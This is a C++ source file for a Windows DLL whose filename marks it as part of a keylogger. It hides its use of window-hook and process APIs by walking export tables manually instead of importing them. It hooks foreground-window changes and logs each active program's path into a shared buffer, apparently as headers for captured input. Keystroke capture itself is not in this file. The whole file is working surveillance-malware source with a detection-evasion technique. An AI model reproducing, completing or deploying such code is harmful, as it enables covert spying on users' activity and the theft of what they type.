//cl /EHsc /LD .\keylog_w_lib.cpp /link User32.lib
#include <Windows.h>
#include <mutex>
#include <string.h>
#include <psapi.h>
#include <vector>
#define DLL_EXPORT __declspec(dllexport)
///////////////////////////////////////////////////////////////////////
HMODULE hUser32,hkernel32, hPsapi;
HWINEVENTHOOK hk;
std::vector<std::string>* sharedLogVector = nullptr;
std::mutex logMutex;
///////////////////////////////////////////////////////////////////////
void CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime);
///////////////////////////////////////////////////////////////////////

typedef HWINEVENTHOOK(WINAPI *SetWinEventHookFn)(UINT, UINT, HMODULE, WINEVENTPROC, DWORD, DWORD, UINT);
typedef BOOL(WINAPI *UnhookWinEventHookFn)(HWINEVENTHOOK);
typedef DWORD(WINAPI *GetWindowThreadProcessIdFn)(HWND, LPDWORD);
typedef HANDLE(WINAPI *OpenProcessFn)(DWORD, BOOL, DWORD);
typedef DWORD(WINAPI *GetModuleFileNameExAFn)(HANDLE, HMODULE, LPSTR, DWORD);
typedef BOOL(WINAPI *CloseHandleFn)(HANDLE);

SetWinEventHookFn MySetWinEventHook;
UnhookWinEventHookFn MyUnhookWinEventHook;
GetWindowThreadProcessIdFn MyGetWindowThreadProcessId;
OpenProcessFn MyOpenProcess;
GetModuleFileNameExAFn MyGetModuleFileNameExA;
CloseHandleFn MyCloseHandle;

///////////////////////////////////////////////////////////////////////

void* FindExportAddress(HMODULE hModule, const char* funcName)
{
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader->e_lfanew);

    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule + ntHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD* nameRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
    WORD* ordRVAs = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
    DWORD* funcRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
    for (DWORD i = 0; i < exportDir->NumberOfNames; ++i)
    {
        char* funcNameFromExport = (char*)((BYTE*)hModule + nameRVAs[i]);
        if (strcmp(funcNameFromExport, funcName) == 0)
        {
            DWORD funcRVA = funcRVAs[ordRVAs[i]];
            return (void*)((BYTE*)hModule + funcRVA);

        }
    }
    return nullptr;
}

DLL_EXPORT void Initialize(std::vector<std::string>* logVector)
{
    HMODULE hUser32 = (HMODULE)LoadLibraryA("user32.dll");
    HMODULE hkernel32 = (HMODULE)LoadLibraryA("kernel32.dll");
    HMODULE hPsapi = (HMODULE)LoadLibraryA("psapi.dll");

    MySetWinEventHook = (SetWinEventHookFn)FindExportAddress(hUser32, "SetWinEventHook");
    MyUnhookWinEventHook = (UnhookWinEventHookFn)FindExportAddress(hUser32, "UnhookWinEventHook");
    MyGetWindowThreadProcessId = (GetWindowThreadProcessIdFn)FindExportAddress(hUser32, "GetWindowThreadProcessId");
    MyOpenProcess = (OpenProcessFn)FindExportAddress(hkernel32, "OpenProcess");
    MyGetModuleFileNameExA = (GetModuleFileNameExAFn)FindExportAddress(hkernel32, "K32GetModuleFileNameExA");
        if (!MyGetModuleFileNameExA) MyGetModuleFileNameExA = (GetModuleFileNameExAFn)FindExportAddress(hPsapi, "GetModuleFileNameExA");   // for older systems
    MyCloseHandle = (CloseHandleFn)FindExportAddress(hkernel32, "CloseHandle");

    sharedLogVector = logVector;
    hk = MySetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL, WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);
}

DLL_EXPORT void Cleanup()
{
    if (hk && MyUnhookWinEventHook)
    {
        MyUnhookWinEventHook(hk);
        FreeLibrary(hUser32);
        FreeLibrary(hkernel32);
        FreeLibrary(hPsapi);
        hk = nullptr;
    }
}

void CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime)
{
    if (event == EVENT_SYSTEM_FOREGROUND) 
    {
        DWORD pid;
        MyGetWindowThreadProcessId(hwnd, &pid);

        HANDLE hProcess = MyOpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if (hProcess)
        {
            char processName[MAX_PATH];
            if (MyGetModuleFileNameExA(hProcess, NULL, processName, MAX_PATH))
            {
                std::string entry = "\n===============[ " + std::string(processName) + " ]===============\n";
                {
                    std::lock_guard<std::mutex> lock(logMutex);
                    sharedLogVector->emplace_back(entry);
                }
            }
            MyCloseHandle(hProcess);
        }
    }
}
